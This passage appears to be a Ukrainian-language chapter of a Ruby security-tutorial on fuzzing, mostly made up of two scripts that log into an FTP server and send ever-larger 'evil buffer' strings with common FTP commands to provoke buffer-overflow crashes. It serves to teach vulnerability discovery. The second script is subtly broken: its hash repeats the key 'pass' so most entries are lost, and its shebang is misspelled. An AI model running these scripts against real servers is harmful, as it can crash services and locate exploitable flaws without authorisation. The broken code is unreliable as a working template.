# Фазер (Fuzzer)

Фазери за звичай використовуються для найпоширеніших або якихось конкретних програм. В цій частині ми покажемо як атакувати найбільш відомі сервіси, використовуючи Рубі. Запам'ятайте, Фазерство це **мистецтво зламати щось**, це не інструменти чи програма.


**Типи фазерів**
- Мутація (Mutation)
- Метадані(Metadata), Файловий формат.

## Мутація


### FTP Фазер

Основна ідея фазінгу FTP сервісів - це перевірити розмір буферів всіх команд. Тим не менш, це не завжди так, наприклад, можна протестувати бефер логіну та пароля. Крім того, цей метод можу бути застосованим до інших сервісів, навіть не стандартних.

```ruby
#!/bin/ruby
# KING SABRI | @KINGSABRI
# Simple FTP COMMNDS Fuzzer
#
require 'socket'

class String
  def red; colorize(self, "\e[31m"); end
  def green; colorize(self, "\e[32m"); end
  def colorize(text, color_code);  "#{color_code}#{text}\e[0m" end
end

mark_Red   = "[+]".red
mark_Green = "[+]".green


host = ARGV[0] || "127.0.0.1"
port = ARGV[1] || 21

# List of FTP protocol commands
cmds = ["MKD","ACCL","TOP","CWD","STOR","STAT","LIST","RETR","NLST","LS","DELE","RSET","NOOP","UIDL","USER","APPE"]

buffer  = ["A"]
counter = 1

cmds.each do |cmd|
  buffer.each do |buf|

    while buffer.length <= 40
      buffer << "A" * counter
      counter += 100
    end

    s = TCPSocket.open(host, port)
    s.recv(1024)
    s.send("USER ftp\r\n", 0)
    s.recv(1024)
    s.send("PASS ftp\r\n", 0)
    s.recv(1024)
    puts mark_Red + " Sending " + "#{cmd} ".green + "Command with " + "#{buf.size} bytes ".green  + "Evil buffer" + ".".green
    s.send(cmd + " " + buf + "\r\n", 0)
    s.recv(1024)
    s.send("QUIT\r\n", 0)
    s.close
  end
  puts "~~~~~~~~~~~~~~~~~~~~".red
  sleep 0.5
end
```

Я подумав, що було б файним зробити цей код більш елегантним, аби мати змогу інспектувати та налаштовувати кожну команду окремо.

```ruby
#!/usr/bin/evn ruby
#
# KING SABRI | @KINGSABRI
# Simple FTP COMMNDS Fuzzer
#
require 'socket'

if ARGV.size < 1 
  puts "#{__FILE__} <host> [port]"
  exit 0 
else
  @host = ARGV[0]
  @port = ARGV[1] || 21
end

def fuzz(payload)
  begin 
  s = TCPSocket.open(@host, @port)
  s.recv(2048)
  s.send payload, 0
  s.recv(2048)
  s.close
  rescue
    puts "Crash detected after #{payload.size} bytes"
    exit 0
  end
end

def insertion(point="", buffer=0)
  buffer = buffer * 10
  points = 
    {
      core:           "A" * buffer,
      user: "USER " + "B" * buffer + "\r\n",
      pass: "PASS " + "C" * buffer + "\r\n",
      pass: "ACCL " + "D" * buffer + "\r\n",
      pass: "APPE " + "E" * buffer + "\r\n",
      pass: "CWD "  + "F" * buffer + "\r\n",
      pass: "DELE " + "G" * buffer + "\r\n",
      pass: "LIST " + "H" * buffer + "\r\n",
      pass: "LS "   + "I" * buffer + "\r\n",
      pass: "MKD "  + "J" * buffer + "\r\n",
      pass: "NLST " + "K" * buffer + "\r\n",
      pass: "NOOP " + "L" * buffer + "\r\n",
      pass: "RETR " + "M" * buffer + "\r\n",
      pass: "RSET " + "N" * buffer + "\r\n",
      pass: "STAT " + "O" * buffer + "\r\n",
      pass: "STOR " + "P" * buffer + "\r\n",
      pass: "TOP "  + "Q" * buffer + "\r\n",
      pass: "UIDL " + "R" * buffer + "\r\n"
      }
  return points[point] unless point.empty?
  points
end

puts "[+] Fuzzing #{@host} on port #{@port}..."
insertion.keys.each do |point|
  (1..500).each do |buffer|
    
    puts "[+] Fuzzing #{point.to_s}: #{insertion(point, buffer).size} bytes"
    fuzz insertion(point, buffer)
    
  end
end
```
> Зверніть увагу, що скрипт можу бути використаним для будь-якого іншого протоколу(IMAP, POP3, etc) оскільки він працює з сокетами!





<br><br><br>
---
